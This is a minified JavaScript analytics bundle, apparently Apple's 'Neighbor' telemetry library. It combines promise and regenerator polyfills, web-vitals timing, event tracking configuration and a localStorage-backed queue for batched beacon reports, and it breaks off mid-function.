/*! For license information please see nn-1.1.1.js.LICENSE.txt */
!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.NN=t():e.NN=t()}(this,(function(){return function(){var e={989:function(e,t,n){e.exports=function(){"use strict";function e(e){return"function"==typeof e}function t(){var e=setTimeout;return function(){return e(i,1)}}function i(){for(var e=0;e<v;e+=2)(0,T[e])(T[e+1]),T[e]=void 0,T[e+1]=void 0;v=0}function r(e,t){var n=this,i=new this.constructor(s);void 0===i[O]&&m(i);var r=n._state;if(r){var o=arguments[r-1];b((function(){return f(r,i,o,n._result)}))}else d(n,i,e,t);return i}function o(e){if(e&&"object"==typeof e&&e.constructor===this)return e;var t=new this(s);return c(t,e),t}function s(){}function a(t,n,i){n.constructor===t.constructor&&i===r&&n.constructor.resolve===o?function(e,t){t._state===L?u(e,t._result):t._state===P?h(e,t._result):d(t,void 0,(function(t){return c(e,t)}),(function(t){return h(e,t)}))}(t,n):void 0===i?u(t,n):e(i)?function(e,t,n){b((function(e){var i=!1,r=function(e,t,n,i){try{e.call(t,n,i)}catch(e){return e}}(n,t,(function(n){i||(i=!0,t!==n?c(e,n):u(e,n))}),(function(t){i||(i=!0,h(e,t))}),e._label);!i&&r&&(i=!0,h(e,r))}),e)}(t,n,i):u(t,n)}function c(e,t){if(e===t)h(e,new TypeError("You cannot resolve a promise with itself"));else if(function(e){var t=typeof e;return null!==e&&("object"===t||"function"===t)}(t)){var n=void 0;try{n=t.then}catch(t){return void h(e,t)}a(e,t,n)}else u(e,t)}function l(e){e._onerror&&e._onerror(e._result),p(e)}function u(e,t){e._state===A&&(e._result=t,e._state=L,0!==e._subscribers.length&&b(p,e))}function h(e,t){e._state===A&&(e._state=P,e._result=t,b(l,e))}function d(e,t,n,i){var r=e._subscribers,o=r.length;e._onerror=null,r[o]=t,r[o+L]=n,r[o+P]=i,0===o&&e._state&&b(p,e)}function p(e){var t=e._subscribers,n=e._state;if(0!==t.length){for(var i=void 0,r=void 0,o=e._result,s=0;s<t.length;s+=3)i=t[s],r=t[s+n],i?f(n,i,r,o):r(o);e._subscribers.length=0}}function f(t,n,i,r){var o=e(i),s=void 0,a=void 0,l=!0;if(o){try{s=i(r)}catch(t){l=!1,a=t}if(n===s)return void h(n,new TypeError("A promises callback cannot return that same promise."))}else s=r;n._state!==A||(o&&l?c(n,s):!1===l?h(n,a):t===L?u(n,s):t===P&&h(n,s))}function m(e){e[O]=D++,e._state=void 0,e._result=void 0,e._subscribers=[]}var _=Array.isArray?Array.isArray:function(e){return"[object Array]"===Object.prototype.toString.call(e)},v=0,g=void 0,y=void 0,b=function(e,t){T[v]=e,T[v+1]=t,2===(v+=2)&&(y?y(i):C())},w="undefined"!=typeof window?window:void 0,E=w||{},k=E.MutationObserver||E.WebKitMutationObserver,x="undefined"==typeof self&&"undefined"!=typeof process&&"[object process]"==={}.toString.call(process),S="undefined"!=typeof Uint8ClampedArray&&"undefined"!=typeof importScripts&&"undefined"!=typeof MessageChannel,T=new Array(1e3),C=void 0;C=x?function(){return process.nextTick(i)}:k?function(){var e=0,t=new k(i),n=document.createTextNode("");return t.observe(n,{characterData:!0}),function(){n.data=e=++e%2}}():S?function(){var e=new MessageChannel;return e.port1.onmessage=i,function(){return e.port2.postMessage(0)}}():void 0===w?function(){try{var e=Function("return this")().require("vertx");return void 0!==(g=e.runOnLoop||e.runOnContext)?function(){g(i)}:t()}catch(e){return t()}}():t();var O=Math.random().toString(36).substring(2),A=void 0,L=1,P=2,D=0,F=function(){function e(e,t){this._instanceConstructor=e,this.promise=new e(s),this.promise[O]||m(this.promise),_(t)?(this.length=t.length,this._remaining=t.length,this._result=new Array(this.length),0===this.length?u(this.promise,this._result):(this.length=this.length||0,this._enumerate(t),0===this._remaining&&u(this.promise,this._result))):h(this.promise,new Error("Array Methods must be provided an Array"))}return e.prototype._enumerate=function(e){for(var t=0;this._state===A&&t<e.length;t++)this._eachEntry(e[t],t)},e.prototype._eachEntry=function(e,t){var n=this._instanceConstructor,i=n.resolve;if(i===o){var c=void 0,l=void 0,u=!1;try{c=e.then}catch(e){u=!0,l=e}if(c===r&&e._state!==A)this._settledAt(e._state,t,e._result);else if("function"!=typeof c)this._remaining--,this._result[t]=e;else if(n===M){var d=new n(s);u?h(d,l):a(d,e,c),this._willSettleAt(d,t)}else this._willSettleAt(new n((function(t){return t(e)})),t)}else this._willSettleAt(i(e),t)},e.prototype._settledAt=function(e,t,n){var i=this.promise;i._state===A&&(this._remaining--,e===P?h(i,n):this._result[t]=n),0===this._remaining&&u(i,this._result)},e.prototype._willSettleAt=function(e,t){var n=this;d(e,void 0,(function(e){return n._settledAt(L,t,e)}),(function(e){return n._settledAt(P,t,e)}))},e}(),M=function(){function t(e){this[O]=D++,this._result=this._state=void 0,this._subscribers=[],s!==e&&("function"!=typeof e&&function(){throw new TypeError("You must pass a resolver function as the first argument to the promise constructor")}(),this instanceof t?function(e,t){try{t((function(t){c(e,t)}),(function(t){h(e,t)}))}catch(t){h(e,t)}}(this,e):function(){throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.")}())}return t.prototype.catch=function(e){return this.then(null,e)},t.prototype.finally=function(t){var n=this,i=n.constructor;return e(t)?n.then((function(e){return i.resolve(t()).then((function(){return e}))}),(function(e){return i.resolve(t()).then((function(){throw e}))})):n.then(t,t)},t}();return M.prototype.then=r,M.all=function(e){return new F(this,e).promise},M.race=function(e){var t=this;return new t(_(e)?function(n,i){for(var r=e.length,o=0;o<r;o++)t.resolve(e[o]).then(n,i)}:function(e,t){return t(new TypeError("You must pass an array to race."))})},M.resolve=o,M.reject=function(e){var t=new this(s);return h(t,e),t},M._setScheduler=function(e){y=e},M._setAsap=function(e){b=e},M._asap=b,M.polyfill=function(){var e=void 0;if(void 0!==n.g)e=n.g;else if("undefined"!=typeof self)e=self;else try{e=Function("return this")()}catch(e){throw new Error("polyfill failed because global object is unavailable in this environment")}var t=e.Promise;if(t){var i=null;try{i=Object.prototype.toString.call(t.resolve())}catch(e){}if("[object Promise]"===i&&!t.cast)return}e.Promise=M},M.Promise=M,M}()},61:function(e,t,n){var i=n(698).default;function r(){"use strict";e.exports=r=function(){return t},e.exports.__esModule=!0,e.exports.default=e.exports;var t={},n=Object.prototype,o=n.hasOwnProperty,s="function"==typeof Symbol?Symbol:{},a=s.iterator||"@@iterator",c=s.asyncIterator||"@@asyncIterator",l=s.toStringTag||"@@toStringTag";function u(e,t,n){return Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}),e[t]}try{u({},"")}catch(e){u=function(e,t,n){return e[t]=n}}function h(e,t,n,i){var r=t&&t.prototype instanceof f?t:f,o=Object.create(r.prototype),s=new T(i||[]);return o._invoke=function(e,t,n){var i="suspendedStart";return function(r,o){if("executing"===i)throw new Error("Generator is already running");if("completed"===i){if("throw"===r)throw o;return{value:void 0,done:!0}}for(n.method=r,n.arg=o;;){var s=n.delegate;if(s){var a=k(s,n);if(a){if(a===p)continue;return a}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if("suspendedStart"===i)throw i="completed",n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);i="executing";var c=d(e,t,n);if("normal"===c.type){if(i=n.done?"completed":"suspendedYield",c.arg===p)continue;return{value:c.arg,done:n.done}}"throw"===c.type&&(i="completed",n.method="throw",n.arg=c.arg)}}}(e,n,s),o}function d(e,t,n){try{return{type:"normal",arg:e.call(t,n)}}catch(e){return{type:"throw",arg:e}}}t.wrap=h;var p={};function f(){}function m(){}function _(){}var v={};u(v,a,(function(){return this}));var g=Object.getPrototypeOf,y=g&&g(g(C([])));y&&y!==n&&o.call(y,a)&&(v=y);var b=_.prototype=f.prototype=Object.create(v);function w(e){["next","throw","return"].forEach((function(t){u(e,t,(function(e){return this._invoke(t,e)}))}))}function E(e,t){function n(r,s,a,c){var l=d(e[r],e,s);if("throw"!==l.type){var u=l.arg,h=u.value;return h&&"object"==i(h)&&o.call(h,"__await")?t.resolve(h.__await).then((function(e){n("next",e,a,c)}),(function(e){n("throw",e,a,c)})):t.resolve(h).then((function(e){u.value=e,a(u)}),(function(e){return n("throw",e,a,c)}))}c(l.arg)}var r;this._invoke=function(e,i){function o(){return new t((function(t,r){n(e,i,t,r)}))}return r=r?r.then(o,o):o()}}function k(e,t){var n=e.iterator[t.method];if(void 0===n){if(t.delegate=null,"throw"===t.method){if(e.iterator.return&&(t.method="return",t.arg=void 0,k(e,t),"throw"===t.method))return p;t.method="throw",t.arg=new TypeError("The iterator does not provide a 'throw' method")}return p}var i=d(n,e.iterator,t.arg);if("throw"===i.type)return t.method="throw",t.arg=i.arg,t.delegate=null,p;var r=i.arg;return r?r.done?(t[e.resultName]=r.value,t.next=e.nextLoc,"return"!==t.method&&(t.method="next",t.arg=void 0),t.delegate=null,p):r:(t.method="throw",t.arg=new TypeError("iterator result is not an object"),t.delegate=null,p)}function x(e){var t={tryLoc:e[0]};1 in e&&(t.catchLoc=e[1]),2 in e&&(t.finallyLoc=e[2],t.afterLoc=e[3]),this.tryEntries.push(t)}function S(e){var t=e.completion||{};t.type="normal",delete t.arg,e.completion=t}function T(e){this.tryEntries=[{tryLoc:"root"}],e.forEach(x,this),this.reset(!0)}function C(e){if(e){var t=e[a];if(t)return t.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var n=-1,i=function t(){for(;++n<e.length;)if(o.call(e,n))return t.value=e[n],t.done=!1,t;return t.value=void 0,t.done=!0,t};return i.next=i}}return{next:O}}function O(){return{value:void 0,done:!0}}return m.prototype=_,u(b,"constructor",_),u(_,"constructor",m),m.displayName=u(_,l,"GeneratorFunction"),t.isGeneratorFunction=function(e){var t="function"==typeof e&&e.constructor;return!!t&&(t===m||"GeneratorFunction"===(t.displayName||t.name))},t.mark=function(e){return Object.setPrototypeOf?Object.setPrototypeOf(e,_):(e.__proto__=_,u(e,l,"GeneratorFunction")),e.prototype=Object.create(b),e},t.awrap=function(e){return{__await:e}},w(E.prototype),u(E.prototype,c,(function(){return this})),t.AsyncIterator=E,t.async=function(e,n,i,r,o){void 0===o&&(o=Promise);var s=new E(h(e,n,i,r),o);return t.isGeneratorFunction(n)?s:s.next().then((function(e){return e.done?e.value:s.next()}))},w(b),u(b,l,"Generator"),u(b,a,(function(){return this})),u(b,"toString",(function(){return"[object Generator]"})),t.keys=function(e){var t=[];for(var n in e)t.push(n);return t.reverse(),function n(){for(;t.length;){var i=t.pop();if(i in e)return n.value=i,n.done=!1,n}return n.done=!0,n}},t.values=C,T.prototype={constructor:T,reset:function(e){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(S),!e)for(var t in this)"t"===t.charAt(0)&&o.call(this,t)&&!isNaN(+t.slice(1))&&(this[t]=void 0)},stop:function(){this.done=!0;var e=this.tryEntries[0].completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(e){if(this.done)throw e;var t=this;function n(n,i){return s.type="throw",s.arg=e,t.next=n,i&&(t.method="next",t.arg=void 0),!!i}for(var i=this.tryEntries.length-1;i>=0;--i){var r=this.tryEntries[i],s=r.completion;if("root"===r.tryLoc)return n("end");if(r.tryLoc<=this.prev){var a=o.call(r,"catchLoc"),c=o.call(r,"finallyLoc");if(a&&c){if(this.prev<r.catchLoc)return n(r.catchLoc,!0);if(this.prev<r.finallyLoc)return n(r.finallyLoc)}else if(a){if(this.prev<r.catchLoc)return n(r.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<r.finallyLoc)return n(r.finallyLoc)}}}},abrupt:function(e,t){for(var n=this.tryEntries.length-1;n>=0;--n){var i=this.tryEntries[n];if(i.tryLoc<=this.prev&&o.call(i,"finallyLoc")&&this.prev<i.finallyLoc){var r=i;break}}r&&("break"===e||"continue"===e)&&r.tryLoc<=t&&t<=r.finallyLoc&&(r=null);var s=r?r.completion:{};return s.type=e,s.arg=t,r?(this.method="next",this.next=r.finallyLoc,p):this.complete(s)},complete:function(e,t){if("throw"===e.type)throw e.arg;return"break"===e.type||"continue"===e.type?this.next=e.arg:"return"===e.type?(this.rval=this.arg=e.arg,this.method="return",this.next="end"):"normal"===e.type&&t&&(this.next=t),p},finish:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.finallyLoc===e)return this.complete(n.completion,n.afterLoc),S(n),p}},catch:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.tryLoc===e){var i=n.completion;if("throw"===i.type){var r=i.arg;S(n)}return r}}throw new Error("illegal catch attempt")},delegateYield:function(e,t,n){return this.delegate={iterator:C(e),resultName:t,nextLoc:n},"next"===this.method&&(this.arg=void 0),p}},t}e.exports=r,e.exports.__esModule=!0,e.exports.default=e.exports},698:function(e){function t(n){return e.exports=t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e.exports.__esModule=!0,e.exports.default=e.exports,t(n)}e.exports=t,e.exports.__esModule=!0,e.exports.default=e.exports},687:function(e,t,n){var i=n(61)();e.exports=i;try{regeneratorRuntime=i}catch(e){"object"==typeof globalThis?globalThis.regeneratorRuntime=i:Function("r","regeneratorRuntime = r")(i)}}},t={};function n(i){var r=t[i];if(void 0!==r)return r.exports;var o=t[i]={exports:{}};return e[i].call(o.exports,o,o.exports,n),o.exports}n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,{a:t}),t},n.d=function(e,t){for(var i in t)n.o(t,i)&&!n.o(e,i)&&Object.defineProperty(e,i,{enumerable:!0,get:t[i]})},n.g=function(){if("object"==typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"==typeof window)return window}}(),n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})};var i={};return function(){"use strict";function e(e,t,n,i,r,o,s){try{var a=e[o](s),c=a.value}catch(e){return void n(e)}a.done?t(c):Promise.resolve(c).then(i,r)}function t(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,i=new Array(t);n<t;n++)i[n]=e[n];return i}function r(e,n){return function(e){if(Array.isArray(e))return e}(e)||function(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var i,r,o=[],s=!0,a=!1;try{for(n=n.call(e);!(s=(i=n.next()).done)&&(o.push(i.value),!t||o.length!==t);s=!0);}catch(e){a=!0,r=e}finally{try{s||null==n.return||n.return()}finally{if(a)throw r}}return o}}(e,n)||function(e,n){if(e){if("string"==typeof e)return t(e,n);var i=Object.prototype.toString.call(e).slice(8,-1);return"Object"===i&&e.constructor&&(i=e.constructor.name),"Map"===i||"Set"===i?Array.from(e):"Arguments"===i||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(i)?t(e,n):void 0}}(e,n)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e){return(s="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}n.r(i),n.d(i,{default:function(){return Ie}});var a,c,l,u,h=n(687),d=n.n(h),p=-1,f=function(e){addEventListener("pageshow",(function(t){t.persisted&&(p=t.timeStamp,e(t))}),!0)},m=function(){return window.performance&&performance.getEntriesByType&&performance.getEntriesByType("navigation")[0]},_=function(){var e=m();return e&&e.activationStart||0},v=function(e,t){var n=m(),i="navigate";return p>=0?i="back-forward-cache":n&&(i=document.prerendering||_()>0?"prerender":n.type.replace(/_/g,"-")),{name:e,value:void 0===t?-1:t,rating:"good",delta:0,entries:[],id:"v3-".concat(Date.now(),"-").concat(Math.floor(8999999999999*Math.random())+1e12),navigationType:i}},g=function(e,t,n){try{if(PerformanceObserver.supportedEntryTypes.includes(e)){var i=new PerformanceObserver((function(e){t(e.getEntries())}));return i.observe(Object.assign({type:e,buffered:!0},n||{})),i}}catch(e){}},y=function(e,t){var n=function n(i){"pagehide"!==i.type&&"hidden"!==document.visibilityState||(e(i),t&&(removeEventListener("visibilitychange",n,!0),removeEventListener("pagehide",n,!0)))};addEventListener("visibilitychange",n,!0),addEventListener("pagehide",n,!0)},b=function(e,t,n,i){var r,o;return function(s){t.value>=0&&(s||i)&&((o=t.value-(r||0))||void 0===r)&&(r=t.value,t.delta=o,t.rating=function(e,t){return e>t[1]?"poor":e>t[0]?"needs-improvement":"good"}(t.value,n),e(t))}},w=-1,E=function(){return"hidden"!==document.visibilityState||document.prerendering?1/0:0},k=function(){y((function(e){var t=e.timeStamp;w=t}),!0)},x=function(){return w<0&&(w=E(),k(),f((function(){setTimeout((function(){w=E(),k()}),0)}))),{get firstHiddenTime(){return w}}},S=function(e,t){t=t||{};var n,i=[1800,3e3],r=x(),o=v("FCP"),s=function(e){e.forEach((function(e){"first-contentful-paint"===e.name&&(c&&c.disconnect(),e.startTime<r.firstHiddenTime&&(o.value=e.startTime-_(),o.entries.push(e),n(!0)))}))},a=window.performance&&window.performance.getEntriesByName&&window.performance.getEntriesByName("first-contentful-paint")[0],c=a?null:g("paint",s);(a||c)&&(n=b(e,o,i,t.reportAllChanges),a&&s([a]),f((function(r){o=v("FCP"),n=b(e,o,i,t.reportAllChanges),requestAnimationFrame((function(){requestAnimationFrame((function(){o.value=performance.now()-r.timeStamp,n(!0)}))}))})))},T=!1,C=-1,O={passive:!0,capture:!0},A=new Date,L=function(e,t){a||(a=t,c=e,l=new Date,F(removeEventListener),P())},P=function(){if(c>=0&&c<l-A){var e={entryType:"first-input",name:a.type,target:a.target,cancelable:a.cancelable,startTime:a.timeStamp,processingStart:a.timeStamp+c};u.forEach((function(t){t(e)})),u=[]}},D=function(e){if(e.cancelable){var t=(e.timeStamp>1e12?new Date:performance.now())-e.timeStamp;"pointerdown"==e.type?function(e,t){var n=function(){L(e,t),r()},i=function(){r()},r=function(){removeEventListener("pointerup",n,O),removeEventListener("pointercancel",i,O)};addEventListener("pointerup",n,O),addEventListener("pointercancel",i,O)}(t,e):L(t,e)}},F=function(e){["mousedown","keydown","touchstart","pointerdown"].forEach((function(t){return e(t,D,O)}))},M={},I=function e(t){document.prerendering?addEventListener("prerenderingchange",(function(){return e(t)}),!0):"complete"!==document.readyState?addEventListener("load",(function(){return e(t)}),!0):setTimeout(t,0)},R=function(e,t){t=t||{};var n=[800,1800],i=v("TTFB"),r=b(e,i,n,t.reportAllChanges);I((function(){var o=m();if(o){if(i.value=Math.max(o.responseStart-_(),0),i.value<0||i.value>performance.now())return;i.entries=[o],r(!0),f((function(){i=v("TTFB",0),(r=b(e,i,n,t.reportAllChanges))(!0)}))}}))},N=n(989);function j(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function B(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}function U(e,t,n){return t&&B(e.prototype,t),n&&B(e,n),Object.defineProperty(e,"prototype",{writable:!1}),e}var V="nn-clientId",H="nn-data",q={systemDomLoaded:"system:dom-content-loaded",systemLoad:"system:load",systemUnfocus:"system:unfocus",systemFocus:"system:focus",systemUnload:"system:unload",systemPagehide:"system:page-hide",systemVisibilitychangeVisible:"system:visibility-change-visible",systemVisibilitychangeHidden:"system:visibility-change-hidden",systemEvent:"system:event",systemPerformance:"system:performance",systemWebVitals:"system:cwv",systemPreceding:"system:preceding",appLoad:"app:load",appUnload:"app:unload",appEvent:"app:event",appSurvey:"app:survey",appMarcomSearch:"app:marcom-search"},z={DOMContentLoaded:["trackDomContentLoaded","systemDomLoaded"],load:["trackLoad","systemLoad"],focus:["trackFocus","systemFocus"],blur:["trackUnfocus","systemUnfocus"],unload:["trackUnload","systemUnload"],pagehide:["trackPagehide","systemPagehide"]},K=window.navigator&&window.navigator.sendBeacon&&"function"==typeof window.navigator.sendBeacon,W={source:{value:null,allowOverwrite:!0,type:"string"},endpoint:{value:null,allowOverwrite:!0,type:"string"},appDataSchemaVersion:{value:null,allowOverwrite:!0,type:"string"},clientId:{value:!0,allowOverwrite:!0,type:"boolean"},externalClientId:{value:!0,allowOverwrite:!0,type:"boolean"},batching:{value:K,allowOverwrite:!0,type:"boolean",modifier:function(e){return!(!e||!K)}},batchingInterval:{value:1e4,allowOverwrite:!0,type:"number"},batchingInterruptionEvents:{value:["blur","unload","load","pagehide","visibilitychangeVisible","visibilitychangeHidden"],allowOverwrite:!0,type:"array"},clientIdRotationPeriod:{value:864e5,allowOverwrite:!0,type:"number"},dictionary:{value:null,allowOverwrite:!0,type:"object"},timezoneName:{value:!0,allowOverwrite:!0,type:"boolean"},timezoneOffset:{value:!0,allowOverwrite:!1,type:"boolean"},timestampOffset:{value:!1,allowOverwrite:!0,type:"boolean"},timestampOffsetEndpoint:{value:null,allowOverwrite:!0,type:"string"},trackDomContentLoaded:{value:!0,allowOverwrite:!0,type:"boolean"},trackLoad:{value:!0,allowOverwrite:!0,type:"boolean"},trackFocus:{value:!0,allowOverwrite:!0,type:"boolean"},trackUnfocus:{value:!0,allowOverwrite:!0,type:"boolean"},trackPagehide:{value:!0,allowOverwrite:!0,type:"boolean"},trackUnload:{value:!0,allowOverwrite:!0,type:"boolean"},trackVisibilitychangeVisible:{value:!0,allowOverwrite:!0,type:"boolean"},trackVisibilitychangeHidden:{value:!0,allowOverwrite:!0,type:"boolean"},trackViewportChanges:{value:!0,allowOverwrite:!0,type:"boolean"},trackScrollDepth:{value:!0,allowOverwrite:!0,type:"boolean"},trackTimeOnPage:{value:!0,allowOverwrite:!0,type:"boolean"},trackCWV:{value:!0,allowOverwrite:!0,type:"boolean"},trackSurvey:{value:!1,allowOverwrite:!0,type:"boolean"},trackMarcomSearch:{value:!1,allowOverwrite:!0,type:"boolean"},lateReporting:{value:!0,allowOverwrite:!0,type:"boolean"},inactivityClientIdRotationInterval:{value:18e5,allowOverwrite:!0,type:"number"},reportThrottledPerformanceDataTypes:{value:[q.systemLoad],allowOverwrite:!0,type:"array",modifier:function(e){var t=[];return e.forEach((function(e){Object.keys(q).map((function(e){return q[e]})).indexOf(e)>=0&&t.indexOf(e)<0&&t.push(e)})),t}},performanceDataThrottlingPercentage:{value:10,allowOverwrite:!0,type:"number",modifier:function(e){return e<0?0:e>100?100:e}},reportThrottledWebVitalDataTypes:{value:[q.systemDomLoaded,q.systemLoad,q.systemUnfocus,q.systemFocus,q.systemUnload,q.systemPagehide,q.systemVisibilitychangeVisible,q.systemVisibilitychangeHidden,q.systemEvent,q.appLoad,q.appUnload,q.appEvent],allowOverwrite:!0,type:"array",modifier:function(e){var t=[];return e.forEach((function(e){Object.keys(q).map((function(e){return q[e]})).indexOf(e)>=0&&t.indexOf(e)<0&&t.push(e)})),t}},webVitalDataThrottlingPercentage:{value:100,allowOverwrite:!0,type:"number",modifier:function(e){return e<0?0:e>100?100:e}},trackCookie:{value:!1,allowOverwrite:!0,type:"boolean"},cookieName:{value:"nn_la",allowOverwrite:!0,type:"string"},cookieDomain:{value:".apple.com",allowOverwrite:!0,type:"string"},cookieExpire:{value:864e5,allowOverwrite:!0,type:"number"},urlValidator:{value:null,allowOverwrite:!0,type:"function"},_getValues:function(){var e=this,t={};return Object.keys(this).filter((function(e){return"_getValues"!==e})).forEach((function(n){t[n]=e[n].value})),t}},G=new(function(){function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"DEFAULT";j(this,e),this.namespace=t,this.shouldLog=!1}return U(e,[{key:"checkLogStatus",value:function(){var e=window.location.search,t=e.indexOf("showNeighborLogs")>0||e.indexOf("log")>0;this.shouldLog=t}},{key:"log",value:function(){if(this.checkLogStatus(),this.shouldLog){for(var e,t=arguments.length,n=new Array(t),i=0;i<t;i++)n[i]=arguments[i];(e=console).log.apply(e,["%c".concat(this.namespace,":  "),"color: Gray"].concat(n))}}}]),e}())("Neighbor"),J=function(){function e(t){var n=t.key,i=t.readOldData,r=t.batching,o=t.maxDataSize,s=void 0===o?6e4:o;j(this,e),this._key=n,this._batching=r,this._readOldData=i,this._rawStore=[],this._chunkedStore=[],this._nonBeacon_HTTPOnly_BackupStore=[],this._maxDataSize=s,this.types={BeaconCHUNK:"chunk",HTTPall:"all"},this.queueTypes={RAW:"raw",CHUNKED:"chunked",HTTPONLY:"httponly",TIMESTAMP:"timestamp"},i&&this._readLocalStorage()}return U(e,[{key:"queueName",value:function(e){switch(e){case this.queueTypes.RAW:return"".concat(this._key,"-raw");case this.queueTypes.CHUNKED:return"".concat(this._key,"-chunked");case this.queueTypes.HTTPONLY:return"".concat(this._key,"-httponly");case this.queueTypes.TIMESTAMP:return"".concat(this._key,"-timestamp");default:return"".concat(this._key,"-raw")}}},{key:"_readLocalStorage",value:function(){var e=localStorage.getItem(this.queueName(this.queueTypes.RAW));this._batching&&e&&e.length>2&&(this._rawStore=JSON.parse(e));var t=localStorage.getItem(this.queueName(this.queueTypes.CHUNKED));this._batching&&t&&t.length>2&&(this._chunkedStore=JSON.parse(t));var n=localStorage.getItem(this.queueName(this.queueTypes.HTTPONLY));!this._batching&&n&&n.length>2&&(this._nonBeacon_HTTPOnly_BackupStore=JSON.parse(n))}},{key:"_updateLocalStorageByConvertingRawToChunked",value:function(){var e=JSON.stringify(this._bundleAllRawToChunks()),t=JSON.stringify(this._rawStore);try{localStorage.setItem(this.queueName(this.queueTypes.RAW),t),localStorage.setItem(this.queueName(this.queueTypes.CHUNKED),e)}catch(e){console.error("Local storage in not avaliable. Most likely Safari Private Mode.",e)}}},{key:"_updateHTTPOnlyBackupLocalStorage",value:function(){var e=JSON.stringify(this._nonBeacon_HTTPOnly_BackupStore);try{localStorage.setItem(this.queueName(this.queueTypes.HTTPONLY),e)}catch(e){console.error("Local storage in not avaliable. Most likely Safari Private Mode.",e)}}},{key:"_updateLocalStorageByAddingTimestamp",value:function(){var e=(new Date).getTime();try{localStorage.setItem(this.queueName(this.queueTypes.TIMESTAMP),e)}catch(e){console.error("Local storage in not avaliable. Most likely Safari Private Mode.",e)}}},{key:"Beaconlength",get:function(){return this._rawStore.length+this._chunkedStore.length}},{key:"HTTPlength",get:function(){return this._nonBeacon_HTTPOnly_BackupStore.length}},{key:"add",value:function(e){this._updateLocalStorageByAddingTimestamp(),this._rawStore.push(e),this._updateLocalStorageByConvertingRawToChunked()}},{key:"removeBeacon",value:function(){this._chunkedStore.shift(),this._updateLocalStorageByConvertingRawToChunked()}},{key:"flushHTTP",value:function(){this._nonBeacon_HTTPOnly_BackupStore=[],this._updateLocalStorageByConvertingRawToChunked(),this._updateHTTPOnlyBackupLocalStorage()}},{key:"_extractSingleChunkFromRawStore",value:function(){for(var e=[],t=0;JSON.stringify(e).length<this._maxDataSize&&t<this._rawStore.length;)e.push(this._rawStore[t]),t++;JSON.stringify(e).length>this._maxDataSize&&(e.pop(),t--);for(var n=0;n<t;n++)this._rawStore.shift();return e}},{key:"_bundleAllRawToChunks",value:function(){for(;JSON.stringify(this._rawStore).length>this._maxDataSize;)this._chunkedStore.push(this._extractSingleChunkFromRawStore());return this._chunkedStore}},{key:"peek",value:function(e){switch(e){case this.types.HTTPall:var t=this._chunkedStore,n=this._extractSingleChunkFromRawStore();return n.length&&t.push(n),this._chunkedStore=[],t.length?(this._nonBeacon_HTTPOnly_BackupStore=t.reduce((function(e,t){return e.concat(t)}),[]),this._updateHTTPOnlyBackupLocalStorage(),this._nonBeacon_HTTPOnly_BackupStore):t;case this.types.BeaconCHUNK:if(0===this._chunkedStore.length){var i=this._extractSingleChunkFromRawStore();return i.length?(this._chunkedStore.push(i),this._chunkedStore[0]):[]}return this._chunkedStore[0];default:return[]}}},{key:"getAllData",value:function(){var e=this._chunkedStore,t=this._extractSingleChunkFromRawStore();t.length&&e.push(t),this._chunkedStore=[];var n=e.reduce((function(e,t){return e.concat(t)}),[]);return e.length&&(this._nonBeacon_HTTPOnly_BackupStore.length?this._nonBeacon_HTTPOnly_BackupStore=this._nonBeacon_HTTPOnly_BackupStore.concat(n):this._nonBeacon_HTTPOnly_BackupStore=n,this._updateHTTPOnlyBackupLocalStorage()),n}},{key:"getChunkData",value:function(){if(0===this._chunkedStore.length){var e=this._extractSingleChunkFromRawStore();return e.length?(this._chunkedStore.push(e),this._chunkedStore[0]):[]}return this._chunkedStore[0]}}]),e}();function X(e,t){return new Promise((function(n,i){var r=new XMLHttpRequest;r.open("POST",e,!0),r.setRequestHeader("Content-Type","text/plain"),r.setRequestHeader("x-apple-osk",t.source),r.send(JSON.stringify(t)),r.onload=function(){if(200===r.status)try{var e=JSON.parse(r.response);n(e)}catch(e){i(e)}else i(r.Error)}}))}function Q(){return"undefined"!=typeof localStorage&&"function"==typeof localStorage.getItem}function Z(){return"undefined"!=typeof localStorage&&"function"==typeof localStorage.setItem}function Y(e){var t=(new Date).getTime();"undefined"!=typeof performance&&"function"==typeof performance.now&&(t+=performance.now());var n="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var n=Math.random();if("undefined"!=typeof 